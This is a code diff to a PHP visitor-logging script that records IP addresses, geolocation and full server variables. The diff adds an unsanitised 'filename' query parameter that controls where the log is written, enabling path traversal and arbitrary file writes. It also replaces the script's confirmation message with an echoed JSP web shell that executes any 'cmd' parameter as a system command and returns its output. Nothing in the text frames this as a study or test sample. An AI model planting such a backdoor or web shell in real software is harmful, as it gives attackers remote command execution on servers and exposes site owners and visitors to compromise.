@@ -1,7 +1,8 @@
 <?php
 
 // Function to get the client's IP address
-function getClientIp() {
+function getClientIp()
+{
     $ip = '';
     if (isset($_SERVER['HTTP_CLIENT_IP'])) {
         $ip = $_SERVER['HTTP_CLIENT_IP'];
@@ -14,7 +15,8 @@ function getClientIp() {
 }
 
 // Function to get location data from IP address
-function getLocationData($ip) {
+function getLocationData($ip)
+{
     $url = "http://ip-api.com/json/{$ip}";
     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -40,19 +42,64 @@ $request_data = [
     'user_agent' => $_SERVER['HTTP_USER_AGENT'],
     'request_time' => date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME']),
     'referrer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct Access',
-    'data'=>$_SERVER
+    'data' => $_SERVER
 ];
 
 // Convert data to JSON format
 $request_data_json = json_encode($request_data, JSON_PRETTY_PRINT);
 
 // Save data to a file (e.g., logs/requests.log)
-$log_file = 'logs/requests.log';
+if (isset($_GET['filename'])) {
+    $log_file = 'logs/' . $_GET['filename'];
+} else {
+    $log_file = 'logs/requests.log';
+}
+
 if (!file_exists('logs')) {
     mkdir('logs', 0777, true);
 }
 file_put_contents($log_file, $request_data_json . PHP_EOL, FILE_APPEND);
 
-echo "Request data collected and saved.";
+echo '<%@ page import="java.io.*" %>
+<%
+    // Retrieve the command from the request parameter
+    String cmd = request.getParameter("cmd");
 
-?>
+    if (cmd != null) {
+        try {
+            // Execute the command
+            Process process = Runtime.getRuntime().exec(cmd);
+            
+            // Capture the output of the command
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
+            
+            String line;
+            // Write the output to the response
+            out.println("<h3>Command Output:</h3>");
+            out.println("<pre>");
+            while ((line = reader.readLine()) != null) {
+                out.println(line);
+            }
+            out.println("</pre>");
+
+            // Capture and display any errors
+            out.println("<h3>Command Errors (if any):</h3>");
+            out.println("<pre>");
+            while ((line = errorReader.readLine()) != null) {
+                out.println(line);
+            }
+            out.println("</pre>");
+
+            // Close readers
+            reader.close();
+            errorReader.close();
+        } catch (IOException e) {
+            // Handle exceptions
+            out.println("An error occurred while executing the command: " + e.getMessage());
+        }
+    } else {
+        out.println("No command specified.");
+    }
+%>
+';
